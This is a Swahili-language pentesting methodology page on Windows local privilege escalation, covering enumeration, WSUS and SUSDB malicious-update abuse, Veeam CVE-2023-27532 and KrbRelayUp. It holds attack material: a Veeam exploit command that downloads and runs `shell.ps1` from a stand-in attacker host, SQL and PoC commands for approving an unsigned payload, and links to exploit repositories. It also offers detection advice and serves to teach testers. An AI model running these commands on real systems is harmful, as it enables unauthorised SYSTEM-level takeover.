# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unakusanya mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia unatokana na warsha na checklists za jumuiya.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **defense mechanisms** hizi zote kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa offline wa UEFI NVRAM kuwa mnyororo wa mashambulizi unaotumia DMA kabla ya boot na kurekebisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ulinzi wa Admin / UIAccess silent elevation

Michakato ya UIAccess iliyoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa kupata High IL bila maombi ya uthibitisho, wakati ukaguzi wa njia salama wa AppInfo unapozungukwa. Angalia mwongozo maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa mipangilio ya registry ya ufikivu ya Secure Desktop unaweza kutumiwa kufanya uandishi holela wa registry kama SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo ya hivi karibuni ya Windows pia yameleta njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye mamlaka ya juu unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia ikiwa toleo la Windows lina vulnerability yoyote inayojulikana (pia angalia patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalotokana na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa kuhusu OS build, updates zilizosakinishwa, na advisory candidates zilizochaguliwa; hakikisha bidhaa husika na updates zinazochukua nafasi ya nyingine kabla ya kuchukulia matokeo kuwa yanahusika.

Kwa exploit ya ndani inayohusiana na toleo maalum, angalia **usanifu wa mchakato unaoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya biti 64, mchakato wa biti 32 huathiriwa na [uelekezaji upya wa mfumo wa faili wa WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye saraka ya mfumo ya biti 32, huku `%windir%\Sysnative` ikiupa mchakato huo ufikiaji wa saraka asilia ya mfumo. Alias hii haipatikani kwa mchakato wa biti 64. OS build au candidate ya KB inayokosekana haithibitishi kwamba exploit inaweza kutumika; linganisha build inayoendeshwa, update iliyosakinishwa au inayochukua nafasi ya nyingine, usanifu wa mchakato, na masharti ya exploit na [bulletin ya usalama ya Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya tatizo husika.

Kwa mfano wa service-memory-corruption, angalia [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Stack offsets zilizochapishwa zinatumika tu kwa build iliyojaribiwa; kufikia `LOCAL SERVICE` ni hatua tofauti na hatua ya baadaye ya [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ya kufikia `SYSTEM`.<sup>[[44]](#references)</sup>

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za Github za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna credential/Juicy info yoyote iliyohifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha kipengele hiki katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya PowerShell transcription](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda ya pamoja au iliyofichwa. Kabla ya kukagua transcript, thibitisha njia halisi ya matokeo na ACL ya faili: inaweza kuwa na hoja za amri na matokeo, yakiwemo vitambulisho vya kuingia. Transcript inayosomeka ni kidokezo tu ikiwa yaliyomo yanafichua utambulisho wenye ruhusa za juu unaoweza kutumika, na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline ya PowerShell hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yasirekodiwe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script huhifadhiwa, kuhakikisha kwamba kila kipande cha code kinaandikwa kinapoendeshwa. Mchakato huu huhifadhi kumbukumbu kamili ya ukaguzi wa kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, hupatikana maarifa ya kina kuhusu mchakato.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana katika Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Mwongozo wa awali ulifupisha hatari hii kama ifuatavyo:

Unaweza kuhatarisha mfumo ikiwa masasisho yanaombwa kupitia http badala ya http**S**.

Endpoint ya WSUS inayotumia HTTP ni ishara ya kuchunguza uwezekano wa kuingiliwa kwa metadata ya masasisho. Unyonyaji pia hutegemea ikiwa mteja anatumia seva hiyo ya WSUS, ikiwa mshambuliaji anaweza kuingilia au kudhibiti trafiki yake, na sera za mteja kuhusu uaminifu na usakinishaji wa masasisho. URL pekee haithibitishi kuwa utekelezaji wa msimbo utawezekana. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kuangalia ikiwa mtandao unatumia masasisho ya WSUS yasiyo ya SSL kwa kuendesha yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipata jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kauli ya awali kuhusu uwezekano wa kutumia udhaifu ilikuwa:

Basi, **inaweza kutumiwa vibaya.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya kunasa HTTP, lakini haithibitishi kuwa kunasa trafiki, kukubali masasisho hasidi, au kusakinisha kwa ruhusa za juu kunawezekana. Wakati thamani ni `0`, sera hiyo haichagui endpoint hii ya WSUS iliyosanidiwa.

Ili kutumia udhaifu huu, unaweza kutumia zana kama vile: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM exploits zilizoandaliwa kuingiza masasisho 'bandia' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hii ndiyo dosari inayotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates hutumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ili kunasa trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, itatumia pia hifadhi yake ya vyeti. Tukizalisha cheti kilichojisaini kwa hostname ya WSUS na kukiongeza kwenye hifadhi ya vyeti ya mtumiaji wa sasa, tutaweza kunasa trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo inayofanana na HSTS kutekeleza uthibitishaji wa aina ya trust-on-first-use kwa cheti. Ikiwa mtumiaji anaiamini cheti kilichowasilishwa na kina hostname sahihi, huduma itakikubali.

Unaweza kutumia udhaifu huu kwa kutumia zana ya [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (itakapopatikana).

### Masasisho yanayodhibitiwa na msimamizi wa WSUS

Kuna njia tofauti ikiwa utambulisho wa sasa unaweza **kuchapisha na kuidhinisha** masasisho kwenye seva ya WSUS. Kagua uanachama halisi kwenye kundi la seva la `WSUS Administrators` na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua kundi la kompyuta za wateja ambalo lingepokea sasisho lililoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha masasisho](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini cheti cha kusaini kinachotumika kwa maudhui yaliyochapishwa ndani. Thibitisha kuwa sasisho husika limetiwa saini na kukubaliwa, linatumika kwa lengo, na linasakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kulichukulia kama njia ya kuongeza ruhusa. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya masasisho maalum ya SUSDB: payloads zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kunasa muunganisho wa HTTP wa WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha wa **stored procedures za hifadhidata ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha sasisho maalum. Njia moja ya vitendo ya kuingia ni kupeleka akaunti ya kompyuta ya WSUS ya upstream kwa seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea usanidi, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani una haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya shambulio inayopeleka uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 hadi LDAP, SMB, au AD CS, tazama [Kutumia vibaya HTTP ya WSUS kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Thibitisha relay ya hifadhidata ya nje na ruhusa za procedure

Katika mazingira ambamo WSUS hutumia SQL Server ya nje, kwanza angalia kama akaunti ya seva ya WSUS inaweza kuthibitishwa kwenye hifadhidata na kama NTLM relay inafika kwenye listener hiyo. Jukumu la SQL la seva linaweza kutoa ufikiaji wa procedures za kuchapisha masasisho hata wakati uandishi wa moja kwa moja kwenye jedwali umekataliwa; `UPDATE` iliyoshindwa dhidi ya `SUSDB` haithibitishi kuwa uchapishaji umezuiwa. Kagua utambulisho halisi, uanachama wa role, na ruhusa za procedure katika session ya SQL iliyoidhinishwa kabla ya kujaribu sasisho maalum.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Ufafanuzi wa taratibu zilizopo na `SoftwareDistributionPackage.xsd` iliyosakinishwa ni muhimu wakati wa kuunda upya metadata halali ya update. Parent ya bundle na child ya payload kila moja zinahitaji `UpdateIdentity` (aina ya fragment `1`), `LocalizedProperties` (`4`), na `ExtendedProperties` (`2`); hifadhi local revision ID inayorejeshwa na kila mwito wa `spImportUpdate` na uhakikishe uhusiano wa bundle, digests, ukubwa, content URL na revision vinaoana. Huu ni mtiririko wa kazi wa uchapishaji wenye hali, kwa hivyo mwito mmoja uliofanikiwa wa stored procedure hauthibitishi execution upande wa client.<sup>[[38]](#references)</sup>

#### Jenga, lenga na uidhinishe update

Mtiririko wa kazi wa custom-update hutumia taratibu halali za WSUS kama API yenye vizuizi ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi fragment za XML za prerequisite, localized na extended | `spSaveXMLFragment` |
| Husisha content digest na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kundi la kompyuta na umwongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima zioane katika metadata/fragments zilizoingizwa. Baada ya kuweka content URL na kundi lengwa, idhini ya mwisho inafanana na ifuatayo; tumia vitambulishi vipya vya update, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS kwa kawaida hukataa maudhui yoyote ya executable ambayo hayajasainiwa. Hata hivyo, ndani ya `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka flag ya ukaguzi wa cheti kuwa false jina la faili lililotolewa linapoishia kwa `.txt` au `.esd`; hivyo `CheckCertificateSignature` hurukwa bila kuthibitisha kwanza kwamba bytes ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita ukaguzi wa maudhui na baadaye kuzinduliwa na handler ya usakinishaji ya command-line ya update. Hili ni hitilafu ya policy/type-confusion, si kughushi saini.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging inayooana na BITS na automation

Kuita `spDeployUpdate` husababisha WSUS kupata maudhui yaliyosajiliwa. Origin lazima itimize matarajio ya HTTP ya BITS: URL inayofikika pekee haitoshi, kwa kuwa uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Server isiyoauni Range husababisha tukio la WSUS la usawazishaji `EventId=364`, linalosema kuwa BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha client ya MSSQL iliyorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa staging ya maudhui. Amri ndogo ya kutumia katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila usimamizi na persistence ya majaribio tena

Mwingiliano wa upande wa mteja hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo la `4 - Auto download and schedule install`, husababisha sasisho lililoidhinishwa kupakuliwa na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kulichagua mwenyewe. Katika majaribio, payload ambayo sasisho lake lilibaki limefeli/kukamilika kwa sehemu ilitolewa tena mara moja baada ya mchakato wa callback kutoka, kwa hiyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; huonekana wazi kwa sababu mteja huonyesha hali ya sasisho lililofeli.<sup>[[39]](#references)</sup>

#### Mwelekeo wa ugunduzi na uimarishaji wa usalama

Mielekeo muhimu ya uchunguzi upande wa seva na mteja kutoka kwenye mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` katika `SUSDB`; chunguza makundi mapya ya kulenga, vyanzo vya nje vya maudhui, payload za sasisho za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` iliyoandikwa vibaya, na `EventId=364`; linganisha uthibitishaji na kiendelezi cha payload na magic ya maudhui badala ya kuamini kiambishi tamati.
- Tafuta usakinishaji wa Windows Update unaofeli/kujaribu tena mara kwa mara, na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Hitaji Extended Protection for Authentication kwa huduma ya hifadhidata inapoungwa mkono, na zuia ufikiaji wa mtandao wa hifadhidata kwa seva ya WSUS na mifumo ya usimamizi iliyoidhinishwa. Punguza na kagua ruhusa za `EXECUTE` kwenye taratibu za custom-update.

## Visasishaji vya Kiotomatiki vya Watoa Huduma Wengine na Agent IPC (local privesc)

Agent nyingi za biashara hutoa eneo la IPC la localhost na njia ya masasisho yenye ruhusa za juu. Ikiwa usajili unaweza kulazimishwa kuelekea seva ya mshambuliaji na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa kawaida anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM huisakinisha. Tazama mbinu ya jumla (iliyotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Maelezo ya awali yaliyohusu toleo mahususi na dokezo la upelelezi yalikuwa:

Veeam B&R < `11.0.1.1261` hutoa huduma ya localhost kwenye **TCP/9401** inayochakata ujumbe unaodhibitiwa na mshambuliaji, na kuruhusu amri za kiholela kutekelezwa kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: thibitisha listener na toleo, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguo-msingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa za hifadhidata ya usanidi ndani ya mpaka wa mtandao wa backup; PoC tofauti ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huduma inaweza kufungamana na anwani nyingine mbali na localhost, kwa hiyo kagua anwani na PID yake halisi.

- **Recon**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patches. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patches.
- **Matoleo ya kwanza yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha build ya msingi isiyo na patch na patch ya baadaye kwenye nambari hizo hizo za build. Thibitisha kitambulisho cha patch dhidi ya [historia ya build ya mtengenezaji](https://www.veeam.com/kb2680) kabla ya kusema kuwa build ya mpaka imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na DLL za Veeam zinazohitajika kwenye saraka hiyo hiyo, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Huduma hutekeleza amri kama SYSTEM.

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM wakati masharti yake ya ziada yametimizwa; ushauri wa vendor unaeleza tatizo la kufichuliwa kwa credentials.

## KrbRelayUp

Maelezo ya awali kuhusu mazingira chaguomsingi yalikuwa:

Kuna vulnerability ya **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambapo **LDAP signing hailazimishwi,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na watumiaji wana uwezo wa kuunda kompyuta ndani ya domain. Ni muhimu kutambua kuwa **mahitaji** haya hutimizwa kwa kutumia **mipangilio chaguomsingi**.

Relay ya Kerberos ya ndani inaweza kuvuka kutoka kwenye logon yenye haki ndogo hadi kwenye uandishi wa directory wenye haki za juu wakati COM server inayofaa inapofanya authentication na principal iliyorilayiwa ina haki kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) RBCD na uandishi wa LDAP wa `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha baadhi ya njia hizi kiotomatiki. Mnyororo wa RBCD unahitaji delegation inayotumika na haki kwenye object lengwa, huku mnyororo wa shadow-credential ukihitaji haki za kuandika key-credential na KDC inayotumia njia ya certificate authentication. Hakuna kati ya njia hizi inayotokana na uanachama wa domain pekee.

Kagua sera halisi ya DC kuhusu [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaorilayiwa, na viwango vya authentication na impersonation vya COM class iliyochaguliwa. Aina ya logon ya mtumiaji na muktadha wa credentials ni muhimu: session ya WinRM inaweza kufanya kazi tofauti na logon ya mwingiliano au ya new-credentials. Firewall/OXID routing na updates zilizosakinishwa zinaweza pia kubadilisha matokeo. Chukulia sera ruhusu au ACL inayolingana kama jambo linalohitaji ukaguzi; enumeration tulivu haipaswi kusababisha COM coercion, relay authentication, au uandishi wa directory. Shadow credential ya machine-account inaweza kusababisha machine ticket na, ikiwa tu akaunti hiyo ina haki zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

